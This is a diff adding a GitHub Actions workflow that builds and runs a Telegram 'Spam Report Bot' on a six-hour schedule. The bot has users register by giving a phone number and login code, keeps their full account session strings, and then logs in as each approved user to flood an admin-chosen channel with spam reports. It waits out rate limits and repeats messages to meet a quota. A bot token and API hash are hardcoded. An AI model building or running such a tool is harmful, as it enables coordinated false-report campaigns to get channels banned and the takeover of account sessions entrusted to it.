@@ -1,0 +1,569 @@
+name: Run Telegram Bot (5h50m per run)
+
+on:
+  schedule:
+    - cron: '0 */6 * * *'
+  workflow_dispatch:
+
+jobs:
+  bot:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v5
+        with:
+          python-version: '3.10'
+      - name: Create bot files
+        run: |
+          cat > requirements.txt << 'EOF'
+          telethon
+          python-telegram-bot==20.3
+          EOF
+
+          cat > reporter.py << 'EOF'
+          #!/usr/bin/env python3
+          import asyncio
+          import re
+          import logging
+          import os
+          import json
+          import random
+          import time
+          import traceback
+          from telethon import TelegramClient
+          from telethon.sessions import StringSession
+          from telethon.tl.functions.messages import ReportRequest
+          from telethon.tl.types import InputReportReasonSpam
+          from telethon.errors import (
+              PhoneNumberInvalidError, PhoneCodeInvalidError,
+              SessionPasswordNeededError, RPCError
+          )
+          from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+          from telegram.ext import (
+              ApplicationBuilder, CommandHandler, ContextTypes,
+              ConversationHandler, MessageHandler, filters, CallbackQueryHandler
+          )
+
+          # ═══════════════════════════════════════════
+          # 📝 CREDENTIALS (UPDATED TOKEN)
+          # ═══════════════════════════════════════════
+          BOT_TOKEN     = '8980218047:AAExWMInFL3EGHGnI9OAR6xACV6aOlJFy4w'
+          API_ID        = 32569415
+          API_HASH      = '4209968745cb99d37820d5ba7b4845bd'
+          ADMIN_USER_ID = 1969067694
+
+          USERS_FILE = 'users.json'
+          CONFIG_FILE = 'config.json'
+          MIN_REPORTS_PER_USER = 20
+
+          logging.basicConfig(
+              level=logging.INFO,
+              format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
+          )
+          logger = logging.getLogger(__name__)
+
+          # ───────────── helpers ─────────────
+          def load_config():
+              if os.path.exists(CONFIG_FILE):
+                  with open(CONFIG_FILE, 'r') as f:
+                      return json.load(f)
+              default = {
+                  'target': None,
+                  'report_limit': 20,
+                  'chunk_size': 5,
+                  'delay_between_chunks': 2,
+                  'flood_wait_default': 120
+              }
+              save_config(default)
+              return default
+
+          def save_config(config):
+              with open(CONFIG_FILE, 'w') as f:
+                  json.dump(config, f, indent=2)
+
+          def load_users():
+              if os.path.exists(USERS_FILE):
+                  with open(USERS_FILE, 'r') as f:
+                      return json.load(f)
+              return {}
+
+          def save_users(users):
+              with open(USERS_FILE, 'w') as f:
+                  json.dump(users, f, indent=2)
+
+          def generate_otp():
+              return str(random.randint(100000, 999999))
+
+          def is_admin(user_id):
+              return user_id == ADMIN_USER_ID
+
+          def is_approved(user_id, users):
+              user = users.get(str(user_id))
+              return user and user.get('approved', False)
+
+          # ───────────── Main Menu ─────────────
+          async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+              keyboard = [
+                  [InlineKeyboardButton("📝 Register", callback_data='register')],
+                  [InlineKeyboardButton("🚀 Report Now", callback_data='report')],
+                  [InlineKeyboardButton("ℹ️ Help", callback_data='help')]
+              ]
+              reply_markup = InlineKeyboardMarkup(keyboard)
+              await update.message.reply_text(
+                  "🤖 **Spam Report Bot**\n"
+                  "All registered users will report together.\n"
+                  f"Each user sends minimum {MIN_REPORTS_PER_USER} reports.\n\n"
+                  "Use the buttons below:",
+                  parse_mode='Markdown',
+                  reply_markup=reply_markup
+              )
+
+          async def main_menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+              query = update.callback_query
+              await query.answer()
+              data = query.data
+              if data == 'register':
+                  await register_start(update, context)
+              elif data == 'report':
+                  await report_button(update, context)
+              elif data == 'help':
+                  await query.edit_message_text(
+                      "ℹ️ **How to use:**\n"
+                      "1. Click **Register** → enter phone → OTP → verify.\n"
+                      "2. Admin approves you via /approve.\n"
+                      "3. Click **Report Now** → enter target (if not set) → all approved users report.\n"
+                      "4. Each user sends at least 20 reports.",
+                      parse_mode='Markdown'
+                  )
+
+          # ───────────── Registration ─────────────
+          PHONE, OTP = range(2)
+
+          async def register_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+              query = update.callback_query
+              await query.answer()
+              user_id = query.from_user.id
+              users = load_users()
+              if str(user_id) in users:
+                  await query.edit_message_text("✅ You are already registered. Waiting for admin approval.")
+                  return ConversationHandler.END
+
+              await query.edit_message_text(
+                  "📱 Please send your phone number with country code (e.g., +1234567890).\n"
+                  "Type /cancel to cancel."
+              )
+              return PHONE
+
+          async def receive_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
+              phone = update.message.text.strip()
+              if not re.match(r'^\+\d{7,15}$', phone):
+                  await update.message.reply_text("❌ Invalid format. Try again or /cancel.")
+                  return PHONE
+
+              try:
+                  client = TelegramClient(StringSession(), API_ID, API_HASH)
+                  await client.connect()
+                  await client.send_code_request(phone)
+                  context.user_data['setup_client'] = client
+                  context.user_data['setup_phone'] = phone
+                  context.user_data['setup_user_id'] = update.effective_user.id
+
+                  await update.message.reply_text(
+                      f"📨 OTP sent to {phone}. Please enter the 6-digit code."
+                  )
+                  return OTP
+              except Exception as e:
+                  await update.message.reply_text(f"❌ Error: {str(e)[:100]}")
+                  return ConversationHandler.END
+
+          async def receive_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
+              code = update.message.text.strip()
+              client = context.user_data.get('setup_client')
+              phone = context.user_data.get('setup_phone')
+              user_id = context.user_data.get('setup_user_id')
+
+              if not client or not phone:
+                  await update.message.reply_text("❌ Session expired. Start again with /start.")
+                  return ConversationHandler.END
+
+              try:
+                  await client.sign_in(phone, code)
+                  session_str = client.session.save()
+                  await client.disconnect()
+
+                  users = load_users()
+                  users[str(user_id)] = {
+                      'phone': phone,
+                      'verified': True,
+                      'approved': False,
+                      'registered_at': int(time.time()),
+                      'session': session_str
+                  }
+                  save_users(users)
+
+                  await update.message.reply_text("✅ Verified! Waiting for admin approval.")
+                  if ADMIN_USER_ID:
+                      try:
+                          await context.bot.send_message(
+                              chat_id=ADMIN_USER_ID,
+                              text=f"📩 New registration:\nUser ID: {user_id}\nPhone: {phone}\n/approve {user_id}"
+                          )
+                      except Exception as e:
+                          logger.error(f"Admin notify failed: {e}")
+                  context.user_data.clear()
+                  return ConversationHandler.END
+
+              except SessionPasswordNeededError:
+                  await update.message.reply_text("🔐 2FA enabled. Send your password.")
+                  return OTP
+              except PhoneCodeInvalidError:
+                  await update.message.reply_text("❌ Wrong OTP. Try again or /cancel.")
+                  return OTP
+              except Exception as e:
+                  await update.message.reply_text(f"❌ Error: {str(e)[:100]}")
+                  return ConversationHandler.END
+
+          async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
+              context.user_data.clear()
+              await update.message.reply_text("Cancelled.")
+              return ConversationHandler.END
+
+          # ───────────── Admin Commands ─────────────
+          async def approve_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
+              if not is_admin(update.effective_user.id):
+                  await update.message.reply_text("⛔ Unauthorized.")
+                  return
+              args = context.args
+              if not args:
+                  await update.message.reply_text("Usage: /approve <user_id>")
+                  return
+              user_id = args[0]
+              users = load_users()
+              if user_id not in users:
+                  await update.message.reply_text(f"User {user_id} not found.")
+                  return
+              users[user_id]['approved'] = True
+              save_users(users)
+              await update.message.reply_text(f"✅ User {user_id} approved.")
+              try:
+                  await context.bot.send_message(chat_id=int(user_id), text="🎉 Approved! You can now report.")
+              except Exception as e:
+                  logger.error(f"Notify user failed: {e}")
+
+          async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
+              if not is_admin(update.effective_user.id):
+                  await update.message.reply_text("⛔ Unauthorized.")
+                  return
+              users = load_users()
+              if not users:
+                  await update.message.reply_text("No users.")
+                  return
+              msg = "📋 Users:\n"
+              for uid, data in users.items():
+                  status = "✅ Approved" if data.get('approved') else "⏳ Pending"
+                  msg += f"ID: {uid}, Phone: {data.get('phone')}, Status: {status}\n"
+              await update.message.reply_text(msg)
+
+          async def set_target(update: Update, context: ContextTypes.DEFAULT_TYPE):
+              if not is_admin(update.effective_user.id):
+                  await update.message.reply_text("⛔ Unauthorized.")
+                  return
+              args = context.args
+              if not args:
+                  await update.message.reply_text("Usage: /settarget <username_or_chat_id>")
+                  return
+              target = ' '.join(args)
+              config = load_config()
+              config['target'] = target
+              save_config(config)
+              await update.message.reply_text(f"✅ Target set to: {target}")
+
+          async def set_limit(update: Update, context: ContextTypes.DEFAULT_TYPE):
+              if not is_admin(update.effective_user.id):
+                  await update.message.reply_text("⛔ Unauthorized.")
+                  return
+              args = context.args
+              if not args or not args[0].isdigit():
+                  await update.message.reply_text("Usage: /setlimit <number> (minimum 20)")
+                  return
+              limit = int(args[0])
+              if limit < MIN_REPORTS_PER_USER:
+                  await update.message.reply_text(f"❌ Limit must be at least {MIN_REPORTS_PER_USER}.")
+                  return
+              config = load_config()
+              config['report_limit'] = limit
+              save_config(config)
+              await update.message.reply_text(f"✅ Report limit set to: {config['report_limit']}")
+
+          async def set_chunk(update: Update, context: ContextTypes.DEFAULT_TYPE):
+              if not is_admin(update.effective_user.id):
+                  await update.message.reply_text("⛔ Unauthorized.")
+                  return
+              args = context.args
+              if not args or not args[0].isdigit():
+                  await update.message.reply_text("Usage: /setchunk <number>")
+                  return
+              config = load_config()
+              config['chunk_size'] = int(args[0])
+              save_config(config)
+              await update.message.reply_text(f"✅ Chunk size set to: {config['chunk_size']}")
+
+          async def set_delay(update: Update, context: ContextTypes.DEFAULT_TYPE):
+              if not is_admin(update.effective_user.id):
+                  await update.message.reply_text("⛔ Unauthorized.")
+                  return
+              args = context.args
+              if not args or not args[0].isdigit():
+                  await update.message.reply_text("Usage: /setdelay <seconds>")
+                  return
+              config = load_config()
+              config['delay_between_chunks'] = int(args[0])
+              save_config(config)
+              await update.message.reply_text(f"✅ Delay set to: {config['delay_between_chunks']}s")
+
+          async def show_config(update: Update, context: ContextTypes.DEFAULT_TYPE):
+              if not is_admin(update.effective_user.id):
+                  await update.message.reply_text("⛔ Unauthorized.")
+                  return
+              config = load_config()
+              users = load_users()
+              approved_count = sum(1 for u in users.values() if u.get('approved'))
+              msg = (
+                  "📊 Current Config:\n"
+                  f"Target: {config.get('target') or 'Not Set'}\n"
+                  f"Report Limit (per user): {config.get('report_limit')}\n"
+                  f"Chunk Size: {config.get('chunk_size')}\n"
+                  f"Delay: {config.get('delay_between_chunks')}s\n"
+                  f"Flood Wait: {config.get('flood_wait_default')}s\n"
+                  f"Approved Users: {approved_count}"
+              )
+              await update.message.reply_text(msg)
+
+          # ───────────── Report Button ─────────────
+          REPORT_TARGET = 99
+
+          async def report_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
+              query = update.callback_query
+              await query.answer()
+              user_id = query.from_user.id
+              users = load_users()
+              if not is_approved(user_id, users):
+                  await query.edit_message_text("⛔ You are not approved. Register and wait for admin approval.")
+                  return
+
+              config = load_config()
+              target = config.get('target')
+              if target:
+                  await query.edit_message_text("🚀 Reporting started with current target.")
+                  await report_all_users(update, context, target)
+              else:
+                  await query.edit_message_text(
+                      "🎯 **Target not set.**\n"
+                      "Please send the target channel username (e.g., @channel) or chat ID (e.g., -100123456).\n"
+                      "Type /cancel to cancel."
+                  )
+                  return REPORT_TARGET
+
+          async def receive_target(update: Update, context: ContextTypes.DEFAULT_TYPE):
+              target = update.message.text.strip()
+              if not target:
+                  await update.message.reply_text("❌ Invalid target. Try again or /cancel.")
+                  return REPORT_TARGET
+
+              config = load_config()
+              config['target'] = target
+              save_config(config)
+              await update.message.reply_text(f"✅ Target set to: {target}\nStarting reporting now...")
+              await report_all_users(update, context, target)
+              return ConversationHandler.END
+
+          async def cancel_report(update: Update, context: ContextTypes.DEFAULT_TYPE):
+              await update.message.reply_text("Cancelled report.")
+              return ConversationHandler.END
+
+          # ───────────── Reporting ─────────────
+          async def report_all_users(update: Update, context: ContextTypes.DEFAULT_TYPE, target: str):
+              users = load_users()
+              approved_users = {uid: data for uid, data in users.items() if data.get('approved')}
+              if not approved_users:
+                  await update.message.reply_text("❌ No approved users available.")
+                  return
+
+              await update.message.reply_text(
+                  f"🚀 Reporting from {len(approved_users)} users...\n"
+                  f"Each user will send at least {MIN_REPORTS_PER_USER} reports.\n"
+                  "Progress will be shown below."
+              )
+
+              for uid, user_data in approved_users.items():
+                  session_str = user_data.get('session')
+                  if not session_str:
+                      await update.message.reply_text(f"⚠️ User {uid} has no session. Skipping.")
+                      continue
+
+                  try:
+                      await report_with_user_session(update, session_str, target, uid)
+                  except Exception as e:
+                      logger.error(f"User {uid} report failed: {e}")
+                      await update.message.reply_text(f"❌ User {uid} failed: {str(e)[:100]}")
+
+              await update.message.reply_text("✅ All users have completed reporting!")
+
+          async def report_with_user_session(update: Update, session_str: str, target: str, uid: str):
+              config = load_config()
+              client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
+              await update.message.reply_text(f"📱 Logging in as user {uid}...")
+
+              try:
+                  await client.start()
+                  await update.message.reply_text(f"✅ User {uid} logged in.")
+
+                  try:
+                      if str(target).lstrip('-').isdigit():
+                          entity = await client.get_entity(int(target))
+                      else:
+                          entity = await client.get_entity(f'@{target}')
+                  except ValueError:
+                      entity = await client.get_entity(target)
+
+                  await update.message.reply_text(f"🎯 Target: {entity.title or entity.username or entity.id}")
+
+                  limit = config.get('report_limit', 20)
+                  if limit < MIN_REPORTS_PER_USER:
+                      limit = MIN_REPORTS_PER_USER
+
+                  messages = []
+                  async for msg in client.iter_messages(entity, limit=limit):
+                      if msg.id:
+                          messages.append(msg.id)
+
+                  if len(messages) < MIN_REPORTS_PER_USER:
+                      original_count = len(messages)
+                      while len(messages) < MIN_REPORTS_PER_USER:
+                          messages.extend(messages[:MIN_REPORTS_PER_USER - len(messages)])
+                      await update.message.reply_text(
+                          f"ℹ️ User {uid}: Only {original_count} unique messages. Repeating to reach {MIN_REPORTS_PER_USER}."
+                      )
+
+                  total = len(messages)
+                  chunk_size = config.get('chunk_size', 5)
+                  delay = config.get('delay_between_chunks', 2)
+                  flood_wait = config.get('flood_wait_default', 120)
+
+                  await update.message.reply_text(f"📨 User {uid}: Sending {total} reports...")
+
+                  success, i = 0, 0
+                  while i < total:
+                      chunk = messages[i:i+chunk_size]
+                      try:
+                          await client(ReportRequest(peer=entity, id=chunk, reason=InputReportReasonSpam()))
+                          success += len(chunk)
+                          await update.message.reply_text(f"✅ User {uid}: Reported {success}/{total}")
+                          i += chunk_size
+                      except Exception as e:
+                          err = str(e)
+                          logger.error(f"User {uid} error: {err}")
+                          if 'FLOOD' in err:
+                              match = re.search(r'FLOOD_WAWAIT_(\d+)', err)
+                              wait = int(match.group(1)) if match else flood_wait
+                              await update.message.reply_text(f"⏳ User {uid}: Flood wait {wait}s...")
+                              await asyncio.sleep(wait)
+                              continue
+                          elif 'PEER_ID_INVALID' in err:
+                              await update.message.reply_text(f"❌ User {uid}: Invalid target!")
+                              break
+                          else:
+                              await update.message.reply_text(f"❌ User {uid}: Failed: {err[:100]}")
+                              i += chunk_size
+                              continue
+                      await asyncio.sleep(delay)
+
+                  await update.message.reply_text(f"✅ User {uid}: Done! Reported {success} messages.")
+                  await client.disconnect()
+
+              except Exception as e:
+                  await update.message.reply_text(f"❌ User {uid}: Login/Report error: {str(e)[:100]}")
+                  logger.exception(f"User {uid} fatal error")
+
+          # ───────────── Main ─────────────
+          async def send_startup_message(app):
+              """Send a test message to admin when bot starts."""
+              try:
+                  await app.bot.send_message(
+                      chat_id=ADMIN_USER_ID,
+                      text="✅ Bot is online and ready! Use /start in your bot."
+                  )
+                  logger.info("Startup message sent to admin.")
+              except Exception as e:
+                  logger.error(f"Failed to send startup message: {e}")
+
+          def main():
+              try:
+                  if BOT_TOKEN == 'YOUR_BOT_TOKEN' or ADMIN_USER_ID == 0:
+                      logger.error("❌ BOT_TOKEN or ADMIN_USER_ID not set correctly.")
+                      return
+
+                  logger.info("🤖 Starting bot...")
+                  app = ApplicationBuilder().token(BOT_TOKEN).build()
+
+                  # Registration conversation
+                  reg_conv = ConversationHandler(
+                      entry_points=[CallbackQueryHandler(register_start, pattern='^register$')],
+                      states={
+                          PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_phone)],
+                          OTP: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_otp)],
+                      },
+                      fallbacks=[CommandHandler('cancel', cancel)],
+                  )
+                  app.add_handler(reg_conv)
+
+                  # Report target input
+                  report_conv = ConversationHandler(
+                      entry_points=[CallbackQueryHandler(report_button, pattern='^report$')],
+                      states={
+                          REPORT_TARGET: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_target)],
+                      },
+                      fallbacks=[CommandHandler('cancel', cancel_report)],
+                  )
+                  app.add_handler(report_conv)
+
+                  # Main menu callback
+                  app.add_handler(CallbackQueryHandler(main_menu_callback, pattern='^help$'))
+
+                  # Admin commands
+                  app.add_handler(CommandHandler('approve', approve_user))
+                  app.add_handler(CommandHandler('listusers', list_users))
+                  app.add_handler(CommandHandler('settarget', set_target))
+                  app.add_handler(CommandHandler('setlimit', set_limit))
+                  app.add_handler(CommandHandler('setchunk', set_chunk))
+                  app.add_handler(CommandHandler('setdelay', set_delay))
+                  app.add_handler(CommandHandler('showconfig', show_config))
+
+                  # Fallback start command
+                  app.add_handler(CommandHandler('start', start_cmd))
+
+                  # Send startup message
+                  app.post_init = send_startup_message
+
+                  logger.info("✅ Bot started successfully. Polling...")
+                  app.run_polling()
+
+              except Exception as e:
+                  logger.error(f"❌ Fatal error in main: {e}")
+                  traceback.print_exc()
+
+          if __name__ == '__main__':
+              main()
+          EOF
+
+          echo "✅ Files created."
+
+      - name: Install dependencies
+        run: |
+          pip install --upgrade pip
+          pip install -r requirements.txt
+
+      - name: Run bot (5h50m)
+        run: python reporter.py
+        continue-on-error: true
